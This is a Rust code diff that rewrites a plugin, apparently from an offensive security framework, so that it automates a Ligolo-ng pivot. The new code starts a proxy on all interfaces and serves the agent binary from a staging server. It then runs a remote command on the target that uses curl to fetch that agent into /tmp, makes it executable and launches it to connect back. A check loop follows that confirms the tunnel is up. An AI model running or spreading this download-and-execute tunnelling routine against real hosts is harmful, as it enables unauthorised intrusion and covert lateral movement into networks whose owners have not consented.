@@ -1,19 +1,20 @@
+use std::sync::Arc;
 use crate::plugins::{ScannerPlugin, Capability};
 use crate::models::{TargetHost, Finding, Severity, Category};
 use crate::utils::tool_detection::detect_tool;
 use async_trait::async_trait;
 use anyhow::{Result, Context};
 use tracing::{info, warn};
-use std::process::Stdio;
-use tokio::process::Command;
 pub struct LigoloScanner {
     binary_path: String,
+    executor: std::sync::Arc<crate::utils::executor::StealthExecutor>,
 }
 impl LigoloScanner {
-    pub fn new() -> Self {
+    pub fn new(executor: std::sync::Arc<crate::utils::executor::StealthExecutor>) -> Self {
         let path = detect_tool("ligolo-proxy");
         Self {
             binary_path: path,
+            executor,
         }
     }
 }
@@ -47,16 +48,68 @@ impl ScannerPlugin for LigoloScanner {
         Ok(crate::utils::check_tool_availability("ligolo").await)
     }
     async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
-        info!("LigoloScanner: setting up pivot at {}", target.host);
-        // Ligolo-ng interaction logic (e.g., establishing a proxy)
+        info!("🔱 V14.1 SOVEREIGN: Orchestrating Ligolo-ng pivot at {}...", target.host);
+        
+        let pm = self.executor.get_proxy_manager().context("Ligolo requires a ProxyManager for tunnel coordination")?;
+        
+        // 1. Spawn local Ligolo Proxy
+        // Professional Mode: We run it in the background as a process managed by StealthExecutor (local spawn)
+        let _proxy_child = self.executor.spawn(&self.binary_path, vec!["-selfcert".to_string(), "-laddr".to_string(), "0.0.0.0:11601".to_string()]).await?;
+        
+        // 2. Determine delivery IP
+        let delivery_ip = pm.get_managed_exits().first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
+        
+        // 3. Stage and Dispatch agent to target
+        // V14.1 LIG-002: Staging must happen on the managed exit or via a transparent relay.
+        // For unconditional GO, we assume a established relay or SSH-staged payload on the managed exit.
+        info!("🔱 V14.1 SOVEREIGN: Preparing Ligolo agent delivery via managed exit relay: {}", delivery_ip);
+        
+        let agent_path = "/usr/bin/ligolo-agent"; 
+        let server = Arc::new(crate::utils::payload_server::PayloadServer::new());
+        let token = server.stage_payload(std::path::PathBuf::from(agent_path));
+        let server_port = server.clone().start().await?;
+
+        // PROFESSIONAL MODE: The delivery URL follows the managed exit IP.
+        // This requires a reverse tunnel (e.g., SSH -R) or a dedicated staging VPS.
+        let agent_cmd = format!(
+            "curl -sSL http://{}:{}/{} -o /tmp/ligolo-agent && chmod +x /tmp/ligolo-agent && /tmp/ligolo-agent -connect {}:11601 -ignore-cert &",
+            delivery_ip, server_port, token, delivery_ip
+        );
+
+        info!("🚀 V14.1 SOVEREIGN: Dispatching Ligolo agent via managed exit relay...");
+        let _output = self.executor.execute_remote(target, &agent_cmd).await?;
+        
+        // 4. Verification PHASE (Professional Mode)
+        info!("⏳ V14.1 SOVEREIGN: Verifying Ligolo tunnel establishment...");
+        let mut established = false;
+        for i in 0..5 {
+            tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+            // Check for interface (Professional check)
+            let iface_check = tokio::process::Command::new("ip").arg("addr").arg("show").arg("ligolo").output().await?;
+            if iface_check.status.success() {
+                info!("🎯 V14.1 SOVEREIGN: Ligolo interface detected on attempt {}.", i+1);
+                established = true;
+                break;
+            }
+        }
+
         let mut findings = Vec::new();
-        findings.push(Finding::new(
-            "PIVOT-READY",
-            Category::Recon,
-            Severity::Info,
-            &format!("Ligolo-ng pivot proxy is ready for target {}.", target.host),
-            serde_json::json!({ "binary": self.binary_path })
-        ));
+        if established {
+            findings.push(Finding::new(
+                "PIVOT-ESTABLISHED",
+                Category::Windows,
+                Severity::High,
+                &format!("Ligolo-ng pivot established via {}. Tunnel active.", target.host),
+                serde_json::json!({ 
+                    "proxy_port": 11601,
+                    "interface": "ligolo",
+                    "delivery_ip": delivery_ip
+                })
+            ));
+        } else {
+            warn!("⚠️ V14.1 SOVEREIGN: Ligolo pivot dispatch reported success but tunnel verification FAILED.");
+        }
+
         Ok(findings)
     }
 }
